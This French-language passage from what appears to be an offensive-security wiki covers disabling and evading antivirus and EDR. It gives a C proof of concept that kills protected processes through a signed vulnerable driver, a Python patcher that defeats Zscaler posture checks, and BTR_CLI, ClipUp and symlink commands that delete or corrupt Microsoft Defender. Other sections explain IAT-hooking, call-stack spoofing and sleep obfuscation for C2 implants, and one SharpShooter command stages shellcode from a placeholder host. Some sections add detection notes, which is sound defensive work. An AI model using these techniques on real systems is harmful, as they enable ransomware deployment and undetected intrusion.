- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d'utilisation de Python pour créer des injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Éliminer les antivirus/EDR depuis l’espace noyau

Storm-2603 a utilisé un petit utilitaire console appelé **Antivirus Terminator** pour désactiver les protections des terminaux avant de déployer un ransomware. L’outil apporte son **propre pilote vulnérable mais *signé*** et l’exploite pour effectuer des opérations privilégiées dans le noyau, que même les services antivirus Protected-Process-Light (PPL) ne peuvent pas bloquer.<sup>[[12]](#references)</sup>

Points clés
1. **Pilote signé** : le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le pilote légitimement signé `AToolsKrnl64.sys`, issu de la « System In-Depth Analysis Toolkit » d’Antiy Labs. Comme le pilote possède une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La première ligne enregistre le driver en tant que **service noyau** et la seconde le démarre afin que `\\.\ServiceMouse` soit accessible depuis l’espace utilisateur.
3. **IOCTLs exposés par le driver**
   | Code IOCTL | Capacité                                |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour arrêter les services Defender/EDR) |
   | `0x990000D0` | Supprimer un fichier arbitraire sur le disque |
   | `0x990001D0` | Décharger le driver et supprimer le service |

   Preuve de concept minimale en C :
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Pourquoi cela fonctionne** : BYOVD contourne entièrement les protections en mode utilisateur ; le code exécuté dans le kernel peut ouvrir des processus *protégés*, les terminer ou altérer des objets du kernel, quels que soient PPL/PP, ELAM ou les autres fonctionnalités de hardening.

Détection / Atténuation
•  Activez la liste de blocage des pilotes vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.
•  Surveillez la création de nouveaux services *kernel* et déclenchez une alerte lorsqu’un pilote est chargé depuis un répertoire accessible en écriture à tous ou absent de la liste d’autorisation.
•  Surveillez les handles en mode utilisateur vers des objets de périphérique personnalisés, suivis d’appels `DeviceIoControl` suspects.

### Contourner les contrôles de posture de Zscaler Client Connector par patching binaire sur disque

**Client Connector** de Zscaler applique localement des règles de posture de l’appareil et s’appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent possible un bypass complet :

1. L’évaluation de la posture se déroule **entièrement côté client** (un booléen est envoyé au serveur).
2. Les endpoints RPC internes vérifient uniquement que l’exécutable qui se connecte est **signé par Zscaler** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

En **patchant quatre binaires signés sur disque**, les deux mécanismes peuvent être neutralisés :

| Binaire | Logique d’origine patchée | Résultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Renvoie toujours `1`, donc chaque contrôle est conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | Remplacé par des NOP ⇒ tout processus (même non signé) peut se connecter aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacé par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Contrôles d’intégrité du tunnel | Court-circuités |

Extrait minimal du patcher :

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Après avoir remplacé les fichiers d’origine et redémarré la pile de services :

* **Tous** les contrôles de posture affichent un état **vert/conforme**.
* Des binaires non signés ou modifiés peuvent ouvrir les points de terminaison RPC nommés (par ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L’hôte compromis obtient un accès sans restriction au réseau interne défini par les stratégies Zscaler.

Cette étude de cas montre comment quelques patches d’octets suffisent à déjouer des décisions de confiance prises uniquement côté client et de simples vérifications de signature.

## Abus des fonctionnalités de confiance de Microsoft Defender `BTR.sys`

Le pilote **Boot-Time Removal** de Defender constitue un contre-exemple intéressant au BYOVD classique. `BTR.sys` est un composant de remédiation légitime signé par Microsoft, sans bug de corruption mémoire ni interface IOCTL ; après avoir obtenu un accès administrateur et `SeLoadDriverPrivilege`, un opérateur peut plutôt falsifier sa transaction de remédiation privée et effectuer les opérations prévues sur les fichiers et le registre en Ring-0. Il s’agit d’une **primitive de neutralisation d’AV/EDR après compromission, et non d’un vecteur d’accès initial ou d’escalade de privilèges** ; le pilote peut être extrait de la ressource `BOOTTIMETOOL` du `MpEngine.dll` de la cible elle-même, plutôt que d’importer un pilote tiers voyant.<sup>[[36]](#references)</sup>

### Préparation du pilote à usage unique

Defender dépose normalement la ressource sous la forme d’un fichier aléatoire `[a-z]{8}.sys` et enregistre un service noyau portant un nom similaire. `DriverEntry` lit la valeur `Args` du service, ouvre le flux de données alternatif NTFS (ADS) référencé, déchiffre et valide la liste d’actions, écrit le retour d’information, puis renvoie `0xC0000056` (`STATUS_DELETE_PENDING`) après une exécution réussie afin que le pilote se décharge au lieu de rester résident. Un service falsifié présente les valeurs caractéristiques suivantes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Le flux `:changelist` contient un blob chiffré avec RC4. Les builds analysés réutilisent une clé fixe de 256 octets ; le chiffrement ne constitue donc pas une frontière d’autorisation. Un plaintext valide comporte un en-tête global de 24 octets (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, un CRC d’en-tête et un ID de transaction dérivé de la charge utile), suivi d’un chemin de feedback UTF-16 terminé par un caractère nul et d’un nombre quelconque d’éléments. Chaque élément possède un en-tête de 16 octets (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), suivi de données propres à l’action et se terminant par **exactement quatre octets NUL**. Chaque région d’en-tête et de données est vérifiée séparément avec le polynôme CRC-32 `0xEDB88320`, un état initial `0xFFFFFFFF` et **sans XOR final** (`~CRC32`) ; l’état du CRC est réinitialisé pour chaque région.<sup>[[36]](#references)[[37]](#references)</sup>

Les ID d’action acceptés exposent ces primitives du noyau.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Données de l’élément | Résultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Supprime un fichier, y compris s’il est verrouillé |
| 2 | `[UTF-16 path]` | Supprime un répertoire vide |
| 3 | `[Flags][source][destination]` | Déplace un fichier vers un chemin protégé choisi par l’attaquant ; une destination vide entraîne sa suppression |
| 4 | `[Flags][key path]` | Supprime récursivement une clé de registre |
| 5 | `[Flags][key path + "\\" + value]` | Supprime une valeur de registre |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Crée ou met à jour une valeur de registre et crée les chemins de clé manquants |

Pour les actions 5 et 6, le séparateur clé/valeur sur le fil est constitué de **deux barres obliques inverses consécutives** ; un chemin au format conventionnel ne sera pas correctement séparé. Le fichier de feedback reflète en grande partie la requête, mais les quatre premiers octets de données de chaque élément deviennent son `NTSTATUS` résultant. Pour les actions 1 et 2, qui n’ont pas de champ de flags initial, BTR déplace le chemin dans les quatre octets réservés de fin afin de libérer de la place pour ce statut.<sup>[[36]](#references)</sup>

### Flux de travail `BTR_CLI` et fenêtre de démarrage précoce

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implémente la chaîne complète : extraire `BTR.sys` de Defender local, créer `<random>.sys:changelist` et un flux de feedback, sérialiser, calculer les sommes de contrôle et chiffrer les actions chaînées, créer directement la clé de registre du service, puis appeler `NtLoadDriver` pour `-trigger now` ou laisser le pilote démarrer avec le système pour `-trigger boot`. La préparation directe dans le registre évite le chemin normal de SCM `CreateServiceW` et ne génère donc **pas** l’événement d’installation de service ID 7045. Les artefacts déclenchés au démarrage peuvent ensuite être supprimés avec `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` n’est pas utilisable, car BTR effectue des opérations d’E/S sur les fichiers depuis `DriverEntry`, avant que la pile de stockage et le lien `SystemRoot` soient prêts. `Start=1`, associé au groupe prioritaire `Boot Bus Extender`, permet au contraire une exécution en Phase 1 : NTFS est utilisable, mais de nombreux pilotes de sécurité à démarrage système et services EDR en mode utilisateur ne sont pas encore initialisés. Des filtres à démarrage système tels que `WdFilter` peuvent déjà être chargés, mais BTR peut supprimer leurs binaires ou leur configuration de service avant le démarrage suivant, et supprimer les exécutables des services avant leur lancement par SCM. ELAM ne comble pas cette faille, car BTR s’exécute après l’évaluation du démarrage et possède une signature Microsoft valide.<sup>[[36]](#references)</sup>

Plusieurs actions sont exécutées dans une même transaction. Le PoC ajoute l’Action 1 pour le chemin codé en dur `\SystemRoot\Temp\BootClean.log` : BTR crée ce journal, puis traite sa propre demande de suppression et l’efface avant de se décharger. Cela réduit les traces, tandis que le stockage des retours dans `<random>.sys:<random>.dat` permet de supprimer le pilote et les deux flux ensemble.<sup>[[36]](#references)[[37]](#references)</sup>

### Corrélations de détection à signal fort

Les règles fondées uniquement sur les signatures et la liste de blocage des pilotes vulnérables de Microsoft ne couvrent pas les abus des fonctionnalités prévues de BTR. Privilégiez les corrélations comportementales suivantes, tout en distinguant une lignée légitime de Defender d’un lanceur quelconque.<sup>[[36]](#references)</sup>

- **Sysmon 15 :** la création de `.sys:changelist` est universelle lors de la préparation de BTR. Un ADS `.dat` associé au même `.sys` est particulièrement suspect, car Defender légitime place normalement les retours sous `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sans System 7045 :** corrélez la création directe de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenant `Args=...:changelist` et `Group=Boot Bus Extender` avec l’absence d’événement d’installation SCM correspondant.
- **Sysmon 6 -> 23 :** corrélez le chargement d’un pilote BTR connu provenant d’une lignée autre que Defender avec une suppression ultérieure de fichier attribuée à `System`/PID 4, en particulier s’il s’agit de binaires de sécurité.
- **Sysmon 11 -> 23 :** déclenchez une alerte en cas de création puis de suppression rapides de `\SystemRoot\Temp\BootClean.log` par `System`/PID 4.
- Restreignez et auditez l’attribution/l’activation de `SeLoadDriverPrivilege` ; une signature Microsoft ne suffit pas à garantir la confiance lorsqu’un pilote d’outil de sécurité est préparé par `cmd.exe`, PowerShell ou un processus inconnu.

## Abuser de Protected Process Light (PPL) pour altérer un AV/EDR avec des LOLBINs

Protected Process Light (PPL) applique une hiérarchie de signataires/niveaux afin que seuls les processus protégés de niveau égal ou supérieur puissent altérer les uns les autres. À des fins offensives, si vous pouvez lancer légitimement un binaire compatible avec PPL et contrôler ses arguments, vous pouvez détourner une fonctionnalité bénigne (par exemple la journalisation) pour en faire une primitive d’écriture limitée, adossée à PPL, ciblant les répertoires protégés utilisés par les AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Conditions pour qu’un processus s’exécute en tant que PPL
- L’EXE cible (ainsi que toutes les DLL chargées) doit être signé avec un EKU compatible avec PPL.
- Le processus doit être créé avec CreateProcess à l’aide des indicateurs : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un niveau de protection compatible correspondant au signataire du binaire doit être demandé (par exemple, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires antimalware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Un niveau incorrect entraînera l’échec de la création.

Voir également une introduction plus générale à PP/PPL et à la protection de LSASS ici :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de lancement
- Outil d’aide open source : CreateProcessAsPPL (sélectionne le niveau de protection et transmet les arguments à l’EXE cible) :
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Modèle d’utilisation :

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive : ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre pour écrire un fichier journal à un chemin spécifié par l’appelant.
- Lorsqu’il est lancé en tant que processus PPL, l’écriture du fichier bénéficie de la protection PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez des chemins courts 8.3 pour pointer vers des emplacements normalement protégés.

Assistants pour les chemins courts 8.3
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Déduire le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Chaîne d’abus (abstraite)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` à l’aide d’un lanceur (par exemple, CreateProcessAsPPL).
2) Passer l’argument de chemin du journal de ClipUp pour forcer la création d’un fichier dans un répertoire AV protégé (par exemple, Defender Platform). Utiliser des noms courts 8.3 si nécessaire.
3) Si l’AV a normalement ouvert/verrouillé le binaire cible pendant son exécution (par exemple, MsMpEng.exe), planifier l’écriture au démarrage, avant le lancement de l’AV, en installant un service à démarrage automatique qui s’exécute de manière fiable plus tôt. Vérifier l’ordre de démarrage avec Process Monitor (journalisation du démarrage).
4) Au redémarrage, l’écriture bénéficiant de la protection PPL a lieu avant que l’AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Exemple d’invocation (chemins masqués/raccourcis pour des raisons de sécurité) :

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes et contraintes
- Vous ne pouvez pas contrôler le contenu écrit par ClipUp, hormis son emplacement ; cette primitive convient à la corruption plutôt qu’à l’injection précise de contenu.
- Nécessite des privilèges locaux d’administrateur/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l’exécution au démarrage évite les verrous de fichiers.

Détections
- Création du processus `ClipUp.exe` avec des arguments inhabituels, en particulier lorsqu’il est lancé par des programmes non standard, au démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Examinez la création/modification de services précédant les échecs de démarrage de Defender.
- Surveillance de l’intégrité des fichiers binaires/répertoires Platform de Defender ; créations/modifications inattendues de fichiers par des processus ayant des indicateurs de processus protégé.
- Télémétrie ETW/EDR : recherchez les processus créés avec `CREATE_PROTECTED_PROCESS` et l’utilisation anormale du niveau PPL par des binaires non AV.

Mesures d’atténuation
- WDAC/Code Integrity : restreignez les binaires signés pouvant s’exécuter en tant que PPL et les processus parents autorisés ; bloquez l’invocation de ClipUp en dehors des contextes légitimes.
- Hygiène des services : limitez la création/modification des services à démarrage automatique et surveillez la manipulation de leur ordre de démarrage.
- Assurez-vous que la protection contre les falsifications de Defender et les protections au démarrage précoce sont activées ; examinez les erreurs de démarrage indiquant une corruption de binaire.
- Envisagez de désactiver la génération des noms courts 8.3 sur les volumes hébergeant les outils de sécurité, si votre environnement le permet (testez soigneusement).

## Falsification de Microsoft Defender via le détournement par symlink d’un dossier de version Platform

Windows Defender choisit la plateforme depuis laquelle il s’exécute en énumérant les sous-dossiers de :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier dont la chaîne de version est la plus élevée dans l’ordre lexicographique (par exemple, `4.18.25070.5-0`), puis démarre les processus du service Defender depuis ce dossier (en mettant à jour les chemins du service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris aux points d’analyse de répertoire (symlinks). Un administrateur peut exploiter ce comportement pour rediriger Defender vers un chemin contrôlable par un attaquant et réaliser du DLL sideloading ou perturber le service.<sup>[[21]](#references)[[22]](#references)</sup>

Prérequis
- Administrateur local (nécessaire pour créer des répertoires/symlinks dans le dossier Platform)
- Possibilité de redémarrer ou de déclencher une nouvelle sélection de plateforme par Defender (redémarrage du service au démarrage)
- Outils intégrés uniquement requis (`mklink`)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de plateforme fait confiance aux entrées de répertoire et choisit la version la plus élevée dans l’ordre lexicographique sans vérifier que la cible pointe vers un chemin protégé/de confiance.

Étapes (exemple)
1) Préparez un clone accessible en écriture du dossier de plateforme actuel, par exemple `C:\TMP\AV` :
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un symlink de répertoire de version supérieure dans Platform pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifiez que MsMpEng.exe (WinDefend) s’exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez voir le nouveau chemin du processus sous `C:\TMP\AV\` et la configuration du service/du registre refléter cet emplacement.

Options post-exploitation
- DLL sideloading/code execution : Déposez/remplacez des DLL que Defender charge depuis son répertoire d’application afin d’exécuter du code dans les processus de Defender. Voir la section ci-dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Arrêt du service/denial : Supprimez le lien symbolique de version afin qu’au prochain démarrage, le chemin configuré ne se résolve pas et que Defender ne démarre pas :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Notez que cette technique ne permet pas à elle seule une élévation de privilèges ; elle nécessite des droits d’administrateur.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Les équipes Red Team peuvent déplacer l’évasion à l’exécution de l’implant C2 vers le module cible lui-même en hookant sa Import Address Table (IAT) et en redirigeant certaines API vers du code indépendant de la position (PIC) contrôlé par l’attaquant. Cette approche généralise l’évasion au-delà du petit nombre d’API exposées par de nombreux kits (par exemple, CreateProcessA) et étend les mêmes protections aux BOFs et aux DLL de post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approche générale
- Charger un blob PIC aux côtés du module cible à l’aide d’un reflective loader (préfixé au module ou fourni en tant que compagnon). Le PIC doit être autonome et indépendant de la position.
- Au chargement de la DLL hôte, parcourir son IMAGE_IMPORT_DESCRIPTOR et modifier les entrées de l’IAT correspondant aux imports ciblés (par exemple, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) pour les faire pointer vers de minces wrappers PIC.
- Chaque wrapper PIC exécute les techniques d’évasion avant d’effectuer un tail-call vers l’adresse de l’API réelle. Les techniques d’évasion typiques comprennent :
  - Memory masking/unmasking autour de l’appel (par exemple, chiffrer les régions du beacon, passer de RWX à RX, modifier les noms/permissions des pages), puis restaurer l’état après l’appel.
  - Call-stack spoofing : construire une pile bénigne et effectuer une transition vers l’API cible afin que l’analyse de la call stack retrouve les frames attendues.<sup>[[9]](#references)</sup>
- Pour assurer la compatibilité, exporter une interface permettant à un script Aggressor (ou équivalent) d’enregistrer les API à hooker pour Beacon, les BOFs et les DLL de post-exploitation.

Pourquoi utiliser le hooking IAT ici
- Fonctionne avec tout code utilisant l’import hooké, sans modifier le code de l’outil ni dépendre de Beacon pour proxifier des API spécifiques.
- Couvre les DLL de post-exploitation : hooker LoadLibrary* permet d’intercepter le chargement des modules (par exemple, System.Management.Automation.dll, clr.dll) et d’appliquer les mêmes techniques de masking et d’évasion de la call stack à leurs appels d’API.
- Rétablit l’utilisation fiable des commandes de post-exploitation qui lancent des processus face aux détections basées sur la call stack, en wrappant CreateProcessA/W.

Schéma minimal d’un IAT hook (pseudocode x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquez le patch après les relocations/ASLR et avant la première utilisation de l’import. Les loaders réfléchis comme TitanLdr/AceLdr montrent le hooking pendant le DllMain du module chargé.
- Gardez les wrappers compacts et compatibles PIC ; résolvez la véritable API via la valeur IAT d’origine capturée avant le patch ou via LdrGetProcedureAddress.
- Utilisez des transitions RW → RX pour le PIC et évitez de laisser des pages inscriptibles et exécutables.

Stub de spoofing de la pile d’appels
- Les stubs PIC de type Draugr construisent une fausse chaîne d’appels (adresses de retour dans des modules bénins), puis basculent vers la véritable API.
- Cela déjoue les détections qui s’attendent à des piles canoniques de Beacon/BOFs pour les API sensibles.
- Combinez cette technique à des techniques de stack cutting/stack stitching pour aboutir dans les frames attendues avant le prologue de l’API.

Intégration opérationnelle
- Ajoutez le loader réfléchi au début des DLL post-ex afin que le PIC et les hooks s’initialisent automatiquement au chargement de la DLL.
- Utilisez un script Aggressor pour enregistrer les API cibles afin que Beacon et les BOFs bénéficient de la même voie d’évasion de façon transparente, sans modification du code.

Considérations de détection/DFIR
- Intégrité de l’IAT : entrées pointant vers des adresses non-image (heap/anonymes) ; vérification périodique des pointeurs d’import.
- Anomalies de pile : adresses de retour n’appartenant pas aux images chargées ; transitions abruptes vers du PIC non-image ; ascendance RtlUserThreadStart incohérente.
- Télémétrie du loader : écritures dans l’IAT depuis le processus ; activité précoce de DllMain qui modifie les thunks d’import ; régions RX inattendues créées au chargement.
- Évasion du chargement d’image : en cas de hooking de LoadLibrary*, surveillez les chargements suspects d’assemblies d’automatisation/CLR corrélés à des événements de masquage mémoire.

Blocs de construction et exemples associés
- Loaders réfléchis qui effectuent un patching de l’IAT pendant le chargement (p. ex., TitanLdr, AceLdr)
- Hooks de masquage mémoire (p. ex., simplehook) et PIC de stack cutting (stackcutting)
- Stubs PIC de spoofing de la pile d’appels (p. ex., Draugr)


## Hooking IAT au moment de l’importation + obfuscation du sommeil (Crystal Palace/PICO)

### Hooks IAT au moment de l’importation via un PICO résident

Si vous contrôlez un loader réfléchi, vous pouvez hooker les imports **pendant** `ProcessImports()` en remplaçant le pointeur `GetProcAddress` du loader par un résolveur personnalisé qui vérifie d’abord les hooks :<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Construisez un **PICO résident** (objet PIC persistant) qui reste en place après la libération du PIC temporaire du loader.
- Exportez une fonction `setup_hooks()` qui remplace le résolveur d’imports du loader (p. ex., `funcs.GetProcAddress = _GetProcAddress`).
- Dans `_GetProcAddress`, ignorez les imports par ordinal et utilisez une recherche de hook basée sur un hash comme `__resolve_hook(ror13hash(name))`. Si un hook existe, renvoyez-le ; sinon, déléguez au véritable `GetProcAddress`.
- Enregistrez les cibles des hooks au moment de l’édition de liens avec les entrées Crystal Palace `addhook "MODULE$Func" "hook"`. Le hook reste valide puisqu’il se trouve dans le PICO résident.

Cela permet une **redirection de l’IAT au moment de l’importation** sans patcher la section de code de la DLL chargée après son chargement.

### Forcer des imports hookables lorsque la cible utilise le parcours du PEB

Les hooks au moment de l’importation ne sont déclenchés que si la fonction figure réellement dans l’IAT de la cible. Si un module résout les API via un parcours du PEB + hash (sans entrée d’import), forcez un véritable import pour que le loader le traite dans `ProcessImports()` :

- Remplacez la résolution d’exports par hash (p. ex., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) par une référence directe comme `&WaitForSingleObject`.
- Le compilateur génère une entrée IAT, ce qui permet l’interception lorsque le loader réfléchi résout les imports.

### Obfuscation du sommeil/de l’inactivité de type Ekko sans patcher `Sleep()`

Au lieu de patcher `Sleep`, hookez les **primitives réelles d’attente/IPC** utilisées par l’implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Pour les attentes longues, encapsulez l’appel dans une chaîne d’obfuscation de type Ekko qui chiffre l’image en mémoire pendant l’inactivité :<sup>[[31]](#references)[[27]](#references)</sup>

- Utilisez `CreateTimerQueueTimer` pour planifier une séquence de callbacks qui appellent `NtContinue` avec des frames `CONTEXT` préparées.
- Chaîne typique (x64) : définir l’image en `PAGE_READWRITE` → chiffrer avec RC4 via `advapi32!SystemFunction032` sur l’image mappée entière → effectuer l’attente bloquante → déchiffrer avec RC4 → **restaurer les permissions de chaque section** en parcourant les sections PE → signaler la fin.
- `RtlCaptureContext` fournit un modèle `CONTEXT` ; clonez-le dans plusieurs frames et définissez les registres (`Rip/Rcx/Rdx/R8/R9`) pour invoquer chaque étape.

Détail opérationnel : renvoyez « success » pour les attentes longues (p. ex., `WAIT_OBJECT_0`) afin que l’appelant poursuive son exécution pendant que l’image est masquée. Ce modèle dissimule le module aux scanners pendant les périodes d’inactivité et évite la signature classique du `Sleep()` patché.

Idées de détection (basées sur la télémétrie)
- Rafales de callbacks `CreateTimerQueueTimer` pointant vers `NtContinue`.
- Utilisation de `advapi32!SystemFunction032` sur de grands tampons contigus de la taille d’une image.
- `VirtualProtect` appliqué à une grande plage, puis restauration personnalisée des permissions de chaque section.

### Enregistrement CFG à l’exécution pour les gadgets d’obfuscation du sommeil

Sur les cibles où CFG est activé, le premier saut indirect vers un gadget au milieu d’une fonction, comme `jmp [rbx]` ou `jmp rdi`, fait généralement planter le processus avec `STATUS_STACK_BUFFER_OVERRUN`, car le gadget ne figure pas dans les métadonnées CFG du module. Pour que les chaînes de type Ekko/Kraken fonctionnent dans des processus renforcés :<sup>[[30]](#references)</sup>

- Enregistrez chaque destination indirecte utilisée par la chaîne avec `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` et des entrées `CFG_CALL_TARGET_VALID`.
- Pour les adresses situées dans des images chargées (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` doit commencer à la **base de l’image** et couvrir **l’image entière**.
- Pour les régions mappées manuellement/PIC/stompées, utilisez plutôt la **base d’allocation** et la taille de l’allocation.
- Marquez non seulement le gadget de dispatch, mais aussi les exports atteints indirectement (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, les appels système d’attente/de signalisation) et toute section exécutable contrôlée par l’attaquant qui deviendra une cible indirecte.

Cela transforme les chaînes de sommeil de type ROP/JOP, qui « ne fonctionnent que dans les processus sans CFG », en une primitive réutilisable dans `explorer.exe`, les navigateurs, `svchost.exe` et d’autres processus compilés avec `/guard:cf`.

